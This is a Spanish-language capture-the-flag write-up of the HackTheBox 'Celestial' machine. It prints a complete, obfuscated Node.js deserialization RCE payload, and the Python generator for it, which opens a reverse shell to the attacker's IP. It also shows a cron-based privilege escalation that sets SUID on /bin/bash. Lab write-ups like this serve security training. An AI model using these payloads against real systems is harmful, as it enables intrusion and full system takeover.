---
layout: single
title: Celestial HTB - WriteUp
excerpt: WriteUp de la máquina Celestial de HTB.
date: 2023-03-08
classes: wide
header:
  teaser: /assets/images/Celestial/Celestial.png
  teaser_home_page: true
  icon: /assets/images/Celestial/Celestial.png
categories:
  - infosec
tags:
  - ctf
  - Linux                         
  - Writeup
  - Web-Enumeration
  - Deserialization-Attack
  - Crontab                       
---



En el día de hoy estaremos resolviendo la máquina Celestial de HackTheBox. Es una máquina Linux y su dirección IP es 10.10.10.85.

### Índice

1. [Enumeración Inicial](#enumeración-inicial)
2. [Web Enumeration](#web-enumeration)
3. [Deserealization Attack In NodeJS](#deserealization-attack-in-nodejs)
4. [Privesc](#privesc)

### Enumeración Inicial

Lo primero que haremos será una enumeración de los servicios expuestos que tiene la máquina. Para esa tarea usaremos nmap.

```bash
nmap -sC -sV -Pn -oN Extraction -p3000 10.10.10.85
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-08 13:08 CET
Nmap scan report for 10.10.10.85
Host is up (0.049s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.38 seconds
```

Vemos que hay abierto un servidor web (HTTP), Si miramos la web podemos ver el siguiente contenido.

![](/assets/images/Celestial/img1.png)

### Web Enumeration

Si hacemos un curl visualizando las cabeceras, podemos ver la siguientes cabeceras.

```bash
curl -I http://10.10.10.85:3000/
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D; Max-Age=900; Path=/; Expires=Wed, 08 Mar 2023 13:00:32 GMT; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 12
ETag: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
Date: Wed, 08 Mar 2023 12:45:32 GMT
Connection: keep-alive
```

Podemos ver la siguiente cookie:

>profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D

Si decodeamos la cookie (Esta encodeada en base64 y en formato URL) podemso ver el contenido de  esta.

```bash
echo "eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==" | base64 -d | jq '.'
```

```json
{
  "username": "Dummy",
  "country": "Idk Probably Somewhere Dumb",
  "city": "Lametown",
  "num": "2"
}
```


Vamos a llevar la petición a Burpsuite, desde ahí vamos a modificar al petición para ver si hay algo mas tramitandose.

![](/assets/images/Celestial/img2.png)

### Deserealization Attack In NodeJS

Vamos a enviar el siguiente payload:

```json
{
  "username": Dummy",
  "country": "Idk Probably Somewhere Dumb",
  "city": "Lametown",
  "num": "2"
}
```

Vamos a provocar un error quitando una doble comilla, vamos a encodearlo en base64 y en caso de que tenga carácteres especiales ponerlo en formato URL.

```bash
echo "{\"username\":\"Dummy,\"country\":\"Idk Probably Somewhere Dumb\",\"city\":\"Lametown\",\"num\":\"2\"}" | base64 -w0
eyJ1c2VybmFtZSI6IkR1bW15LCJjb3VudHJ5IjoiSWRrIFByb2JhYmx5IFNvbWV3aGVyZSBEdW1iIiwiY2l0eSI6IkxhbWV0b3duIiwibnVtIjoiMiJ9Cg==
```

Pondremos los "="  en formato url encode 

```json
eyJ1c2VybmFtZSI6IkR1bW15LCJjb3VudHJ5IjoiSWRrIFByb2JhYmx5IFNvbWV3aGVyZSBEdW1iIiwiY2l0eSI6IkxhbWV0b3duIiwibnVtIjoiMiJ9Cg%3D%3D
```

Mandaremos el payload en la cookie y veremos lo que pasa.

![](/assets/images/Celestial/img3.png)

Vemos que se está usando la función unserialize, si investigamos un poco sobre esto podemos encontrar el siguiente post. https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ La verdad que lo explica bastante bien. Usaremos este script en python para crear el payload que nos establecerá una revshell.

```python
#!/usr/bin/python
# Generator for encoded NodeJS reverse shells
# Based on the NodeJS reverse shell by Evilpacket
# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)
# Insecurety Research (2013) - insecurety.net
import sys

if len(sys.argv) != 3:
    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

print "[+] LHOST = %s" % (IP_ADDR)
print "[+] LPORT = %s" % (PORT)
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)
print "[+] Encoding"
PAYLOAD = charencode(NODEJS_REV_SHELL)
print "eval(String.fromCharCode(%s))" % (PAYLOAD)
```


Esto nos genarará el siguiente payload.


```bash
python2 node.py 10.10.16.6 443
[+] LHOST = 10.10.16.6
[+] LPORT = 443
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,54,46,54,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```


FInalmente nos quedaría el siguiente payload, ya preparado para codificarlo en base64.

```bash
{"rce":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,54,46,54,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
```

Lo encodeamos y nos ponemos ponemos a la escuha en nuestro listener. Una vez hecho eso, podemos eviar la petición.

![](/assets/images/Celestial/img4.png)

Si miramos nuestro listener, vemos lo siguiente:

```bash
nc -lvvp 443
listening on [any] 443 ...
10.10.10.85: inverse host lookup failed: Unknown host
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.85] 60238
Connected!
id
uid=1000(sun) gid=1000(sun) groups=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

### Privesc

Hacemos el tratamiento de la tty y empezamos a enumerar la máquina para escalar privilegios. Lo que tendremos que hacer es ver si hay alguna tarea cron ejecutandose. Para ello podemos usar la utilidad pspy.

```bash
2023/03/08 08:19:33 CMD: UID=0     PID=1      | /sbin/init splash 
2023/03/08 08:20:01 CMD: UID=0     PID=7884   | /bin/sh -c python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py 
2023/03/08 08:20:01 CMD: UID=0     PID=7883   | /bin/sh -c python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py 
2023/03/08 08:20:01 CMD: UID=0     PID=7882   | /usr/sbin/CRON -f 
2023/03/08 08:20:01 CMD: UID=0     PID=7885   | cp /root/script.py /home/sun/Documents/script.py 
2023/03/08 08:20:01 CMD: UID=0     PID=7886   | chown sun:sun /home/sun/Documents/script.py 
2023/03/08 08:20:01 CMD: UID=0     PID=7887   | /bin/sh -c python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py 
2023/03/08 08:20:01 CMD: UID=0     PID=7888   | date -R -r /home/sun/Documents/user.txt 
2023/03/08 08:20:01 CMD: UID=0     PID=7889   | /bin/sh -c python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py
```

Vemos que hay una tarea ejecutandose, en concreto se está ejecutando /home/sun/Documents/script.py vamos ver los permisos que tenemos sobre el archivo.

```bash
bash-4.3$ ls -la /home/sun/Documents/script.py 
-rw-rw-r-- 1 sun sun 29 Mar  8 04:31 /home/sun/Documents/script.py
```

Podemos cambiar el archivo, vamos a modificarlo para otorogarle privilegios SUID a la bash

```python
bash-4.3$ cat /home/sun/Documents/script.py 
import os
os.system('chmod +s /bin/bash')
```

Si esperamos a que el script se vuelva a ejecutar, podemos ver que la bash tiene privilegios SUID.

```bash
bash-4.3$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1037528 Jun 24  2016 /bin/bash
```

Ahora podemos ejecutar la bash de forma privilegiada.

```bash
bash-4.3$ bash -p
bash-4.3# id
uid=1000(sun) gid=1000(sun) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(sun)
bash-4.3# 
```

Ya hemos pwneado la máquina, espero que te haya servido!




